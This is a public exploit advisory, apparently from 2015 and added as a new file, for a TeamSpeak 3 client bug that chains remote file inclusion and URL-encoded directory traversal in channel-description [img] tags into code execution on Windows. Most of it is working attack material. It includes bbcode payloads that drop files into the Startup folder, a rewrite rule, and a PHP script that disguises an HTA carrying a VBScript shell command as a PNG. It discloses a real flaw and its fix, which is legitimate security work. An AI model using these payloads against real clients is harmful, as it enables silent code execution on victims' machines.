@@ -1,0 +1,132 @@
+Exploit Title: "PwnSpeak" a 0day Exploit for TeamSpeak Client <= 3.0.18.1 RFI to RCE
+Date: 12/10/2015
+Author: Scurippio <scurippio@anche.no> / (0x6FB30B11 my pgp keyid) 
+Vendor Homepage: https://www.teamspeak.com/ 
+Application:  TeamSpeak 3
+Version:  TeamSpeak3 Client 3.0.0 - 3.0.18.1
+Platforms:  Windows, Mac OS X and Linux
+Exploitation: Remote
+Risk : Very High
+
+=========
+The Bug
+=========
+
+The bug is a simple but Critical RFI(Remote File Inclusion), and in my test case on "Windows" you can reach remote code execution. 
+By changing the channel description you can insert a [img] bb tag with malicious content.
+
+There are a few problems with the image caching on disk.
+
+1: There is no check on file extension.
+
+2: There is no file renaming, and you can fake the extension so you can create in the cache a malicious executable file like hta, scr, msi, pif, vbs etc. 
+
+	Example:
+
+	[img] http://yourevilhost.com/thefile.hta [/img]
+	[img] http://yourevilhost.com/thefile.msi [/img]
+	[img] http://yourevilhost.com/thefile.vbs [/img]
+	...
+
+3: Teamspeak 3 Client saves the image and recreates the same directory structure as the server where it's hosted.
+
+	Example:
+
+	C:\Users\YourUser\AppData\Roaming\TS3Client\cache\remote\yourevilhost.com\thefile.hta
+	C:\Users\YourUser\AppData\Roaming\TS3Client\cache\remote\yourevilhost.com\thefile.msi
+	C:\Users\YourUser\AppData\Roaming\TS3Client\cache\remote\yourevilhost.com\thefile.vbs
+	...
+
+4: It is possible to do a Directory Traversal with a simple urlencode of the traversal path bypassing the built-in control.
+This is the critical hole, if you combine the previous vulnerabilities you can save a malicious file in any path on the OS with the same permissions as Teamspeak client.
+
+	Example:
+
+	[img]http://evildomain.com/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cDesktop%5cOwnedByNonnOreste.hta[/img]
+
+If you set this bbcode on a channel description every user that sees it will download a file named "OwnedByNonnOreste.hta" on their Desktop with 0byte, you can also put images or other file extension!
+
+The built-in image fetcher in the Teamspeak client checks the content type and the file header to check if the response is a real image, but you can easily bypass this control and put your exploit payload.
+
+==========================================
+Bypass / Vector / Payload
+==========================================
+To bypass the control and put arbitrary data in your malicious file you only need a web server and you can easily set the Rewrite rule for the Exploitation.
+
+	Example:
+	
+	RewriteEngine On
+	RewriteCond %{REQUEST_URI} !/faker.php
+	RewriteRule .* /faker.php
+
+Then you need to write a simple php script to fake the payload as a png by sending the right content type and file header.
+
+	Example:
+	
+	<?php
+	header ('Content-type: image/png');
+	echo "\211PNG\r\n\032\n";
+	?>
+	<html>
+	<head>
+	<title>PWN3D</title>
+	<HTA:APPLICATION
+	  APPLICATIONNAME="OwnedByScurippio"
+	  ID="SnappySnappySna"
+	  VERSION="1.0"/>
+
+	<script language="VBScript">
+		
+	   Sub RunProgram
+			Set objShell = CreateObject("Wscript.Shell")
+			objShell.Run "calc.exe"
+		End Sub
+		RunProgram
+	</script>
+	</head>
+	</html>
+
+If you save the file in the windows startup directory you can achieve a remote code execution.
+
+	Example:
+
+	[img]http://example.com/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cRoaming%5cMicrosoft%5cWindows%5cStart%20Menu%5cPrograms%5cStartup%5cWelcomeAndOwnedByNonnOreste.hta[/img]
+	[img]http://example.com/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cRoaming%5cMicrosoft%5cWindows%5cStart%20Menu%5cPrograms%5cStartup%5cWelcomeAndOwnedByNonnOreste.hta[/img]
+
+The HTA file is a prefect vector for this exploit, you can execute trusted vb script (shell command or anything else) and the png header doesn't compromise the markup language syntax.
+At the next OS boot the victim will execute the malicious HTA file.
+
+=======
+Fix 
+=======
+
+Update to beta channel or wait the 3.0.18.2 hotfix for this exploit!
+
+======
+Info 
+======
+
+10/20/2015 - I have reported this Vulnerability to Teamspeak developers team  
+
+********* - Release the public exploit
+
+- Fuck the 'Captatori' - Tracciabili
+
+(Snappy is always with you :P )
+
+
+Copyright (c) 2015 Scurippio
+
+Permission is granted for the redistribution of this alert
+electronically. It may not be edited in any way without mine express
+written consent. If you wish to reprint the whole or any
+part of this alert in any other medium other than electronically,
+please email me for permission.
+
+Disclaimer: The information in the advisory is believed to be accurate
+at the time of publishing based on currently available information. Use
+of the information constitutes acceptance for use in an AS IS condition.
+There are no warranties with regard to this information. Neither the
+author nor the publisher accepts any liability for any direct, indirect,
+or consequential loss or damage arising from use of, or reliance on,
+this information.
